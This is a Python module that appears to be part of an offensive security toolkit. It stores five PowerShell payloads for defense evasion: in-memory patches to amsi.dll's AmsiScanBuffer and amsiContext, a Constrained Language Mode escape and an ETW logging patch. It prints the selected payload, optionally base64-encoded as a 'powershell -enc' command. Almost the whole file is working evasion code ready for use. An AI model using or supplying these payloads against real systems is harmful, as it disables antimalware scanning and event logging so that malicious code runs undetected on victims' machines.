"""AMSI bypass — multiple techniques for Antimalware Scan Interface evasion."""
import base64
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.evasion.amsi_bypass.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["memory_patch"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1562.001"],
}

BYPASSES = {
    "patch_amsi_dll": (
        '[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),'
        '0,[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").'
        'GetField("amsiContext","NonPublic,Static").GetValue($null),6)'
    ),
    "reflection_bypass": (
        '$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};'
        '$b=$a.GetFields("NonPublic,Static")|?{$_.Name -like "*Context"};'
        '[IntPtr]$ptr=$b.GetValue($null);'
        '[Int32[]]$buf=@(0);'
        '[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)'
    ),
    "clm_bypass": (
        '$ExecutionContext.SessionState.LanguageMode="FullLanguage"'
    ),
    "etw_patch": (
        '[Reflection.Assembly]::LoadWithPartialName("System.Core").'
        'GetType("System.Diagnostics.Eventing.EventProvider").'
        'GetField("m_enabled","NonPublic,Instance").SetValue('
        '[Diagnostics.Tracing.EventSource].GetField("m_eventData",'
        '"NonPublic,Instance").GetValue([Diagnostics.Tracing.EventSource]'
        '.GetField("s_currentPid","NonPublic,Static")),0)'
    ),
    "amsi_scanBuffer_patch": (
        'function Bypass-AMSI {'
        '$Kernel32 = @"'
        'using System;using System.Runtime.InteropServices;'
        'public class Kernel32{[DllImport("kernel32")]'
        'public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);'
        '[DllImport("kernel32")]'
        'public static extern IntPtr LoadLibrary(string name);'
        '[DllImport("kernel32")]'
        'public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,'
        'uint flNewProtect,out uint lpflOldProtect);}'
        '"@;Add-Type $Kernel32;'
        '$addr=[Kernel32]::GetProcAddress([Kernel32]::LoadLibrary("amsi.dll"),"AmsiScanBuffer");'
        '$p=0;[Kernel32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p);'
        '$patch=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);'
        '[Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,6);}'
    ),
}


def run(args: Any) -> int:
    technique = getattr(args, "amsi_technique", "patch_amsi_dll")
    encode = getattr(args, "encode", False)

    if technique == "list":
        print("[*] Available AMSI bypass techniques:")
        for k in BYPASSES:
            print(f"  - {k}")
        return 0

    payload = BYPASSES.get(technique)
    if not payload:
        print(f"[!] Unknown technique: {technique}")
        return 1

    if encode:
        b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
        print(f"[*] AMSI bypass ({technique}) — encoded:")
        print(f"  powershell -enc {b64}")
    else:
        print(f"[*] AMSI bypass ({technique}):")
        print(f"  {payload}")
    return 0
